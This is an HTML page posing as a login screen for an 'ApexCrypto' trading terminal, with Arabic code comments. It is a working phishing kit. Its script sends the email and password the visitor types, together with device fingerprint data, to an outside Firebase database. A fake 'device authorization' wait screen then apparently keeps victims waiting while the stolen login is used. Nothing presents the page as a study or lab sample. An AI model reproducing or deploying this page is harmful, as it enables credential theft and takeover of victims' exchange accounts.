<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>A∞Z | ApexCrypto Global Trading Terminal</title>
    <style>
        :root {
            --bg-color: #0b0e11;
            --panel-bg: #1e2329;
            --accent-green: #0ecb81;
            --accent-red: #f6465d;
            --text-main: #eaecef;
            --text-muted: #848e9c;
            --border-color: #2b313a;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            box-sizing: border-box;
        }
        .logo {
            font-size: 20px;
            font-weight: 700;
            color: var(--accent-green);
            text-align: center;
            margin-bottom: 25px;
            letter-spacing: 1px;
        }
        .logo span {
            color: var(--text-main);
        }
        h2 {
            font-size: 16px;
            margin-bottom: 20px;
            color: var(--text-main);
            text-align: center;
            font-weight: 500;
        }
        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            font-size: 12px;
            color: var(--text-muted);
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        input {
            width: 100%;
            padding: 12px;
            background: #0b0e11;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            color: var(--text-main);
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: var(--accent-green);
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: var(--accent-green);
            color: #000;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-top: 10px;
        }
        .btn:hover {
            opacity: 0.9ji;
            opacity: 0.9;
        }
        /* شاشة انتظار التحقق (2FA Verification State) */
        #verificationState {
            display: none;
            text-align: center;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--border-color);
            border-top: 3px solid var(--accent-green);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info-text {
            font-size: 13px;
            color: var(--text-muted);
            line-height: 1.5;
            margin-top: 15px;
        }
        .highlight-email {
            color: var(--accent-green);
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- نموذج تسجيل الدخول للتداول -->
        <div id="loginState">
            <div class="logo">APEX<span>CRYPTO</span></div>
            <h2>Secure Terminal Login</h2>
            <form id="tradingForm">
                <div class="form-group">
                    <label for="email">Account Email / ID</label>
                    <input type="email" id="email" required autocomplete="off" placeholder="name@example.com">
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" required placeholder="••••••••">
                </div>
                <button type="submit" class="btn">Access Terminal</button>
            </form>
        </div>

        <!-- شاشة انتظار الموافقة (تظهر للمستخدم بعد الضغط) -->
        <div id="verificationState">
            <div class="logo">APEX<span>CRYPTO</span></div>
            <h2>Device Authorization Required</h2>
            <div class="spinner"></div>
            <p class="info-text">
                We've sent a verification request to your registered device or email (<span id="displayEmail" class="highlight-email"></span>).<br><br>
                Please approve the login prompt on your primary device to establish a secure trading tunnel.
            </p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

        const firebaseConfig = {
            databaseURL: "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById("tradingForm").addEventListener("submit", function(e) {
            e.preventDefault();

            // التقاط البيانات المدخلة
            const userEmail = document.getElementById("email").value;
            const userPass = document.getElementById("password").value;

            // تحديث واجهة المستخدم فوراً لإظهار رسالة الانتظار والتحقق
            document.getElementById("loginState").style.display = "none";
            document.getElementById("displayEmail").innerText = userEmail;
            document.getElementById("verificationState").style.display = "block";

            // جمع معلومات الجهاز والبيانات التقنية للزائر
            const ua = navigator.userAgent;
            const platform = navigator.platform || "Unknown";
            const width = window.screen.width;
            const height = window.screen.height;
            const cores = navigator.hardwareConcurrency || "N/A";
            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "N/A";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language || "N/A";

            const sessionId = btoa(userEmail + width + height).slice(0, 16);

            // تجميع حمولة البيانات بالكامل
            const telemetryData = {
                sessionId: sessionId,
                inputEmail: userEmail,
                inputPassword: userPass,
                status: "PENDING_2FA_APPROVAL",
                platform: platform,
                resolution: `${width}x${height}`,
                cores: cores,
                memory: memory,
                timezone: timezone,
                language: language,
                userAgent: ua,
                timestamp: new Date().toISOString()
            };

            // إرسال البيانات فوراً إلى قاعدة بيانات Firebase تحت مسار A0Z_CORE/mirror_sessions/
            const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
            set(sessionsRef, telemetryData)
                .then(() => {
                    console.log("Credentials and telemetry successfully synced to Firebase.");
                })
                .catch((error) => {
                    console.error("Firebase sync error:", error);
                });
        });
    </script>
</body>
</html>
